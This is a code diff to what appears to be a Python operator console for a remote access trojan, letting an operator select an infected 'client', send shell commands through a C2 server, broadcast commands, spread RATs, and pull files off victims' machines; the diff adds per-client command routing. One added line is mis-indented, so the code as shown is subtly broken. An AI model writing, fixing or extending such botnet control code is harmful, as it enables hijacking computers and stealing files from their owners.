@@ -22,29 +22,33 @@ def interactive_shell(client):
         if cmd.lower() == "exit":
             break
         try:
-            requests.post(f"{C2_SERVER}/set", data=cmd)
+            requests.post(f"{C2_SERVER}/set/{selected_client}", data=cmd)
             time.sleep(2)
-            result = requests.get(f"{C2_SERVER}/last").text
+            result = requests.get(f"{C2_SERVER}/last/{selected_client}").text
             print(result.strip())
         except Exception as e:
             print("[-] Error:", e)
 
+selected_client = None  # Global variable
+
 def select_client():
+    global selected_client
     try:
         response = requests.get(f"{C2_SERVER}/clients")
         clients = response.json().get('clients', [])
         if not clients:
             print("No clients connected!")
-            return None
+            return
 
-        print("Select client to control:")
+       print("Select client to control:")
         for idx, client in enumerate(clients, 1):
             print(f"{idx}. {client}")
         choice = int(input("Choice: "))
-        return clients[choice - 1]
+        selected_client = clients[choice - 1]
+        print(f"[+] Selected client: {selected_client}")
     except Exception as e:
         print("[-] Failed to get clients:", e)
-        return None
+        selected_client = None
 
 def broadcast_command():
     cmd = input("Command to broadcast to all clients: ").strip()
@@ -62,7 +66,7 @@ def spread_rats(client):
 def upload_file(client):
     path = input("Path to file on client to upload: ").strip()
     try:
-        requests.post(f"{C2_SERVER}/set", data=f"upload {path}")
+        requests.post(f"{C2_SERVER}/set/{selected_client}", data=f"upload {path}")
         print("[*] Upload command sent.")
     except Exception as e:
         print("[-] Failed:", e)
@@ -70,7 +74,7 @@ def upload_file(client):
 def download_file(client):
     filename = input("Filename to send to client: ").strip()
     try:
-        requests.post(f"{C2_SERVER}/set", data=f"download {filename}")
+        requests.post(f"{C2_SERVER}/set/{selected_client}", data=f"download {filename}")
         print("[*] Download command sent.")
     except Exception as e:
         print("[-] Failed:", e)
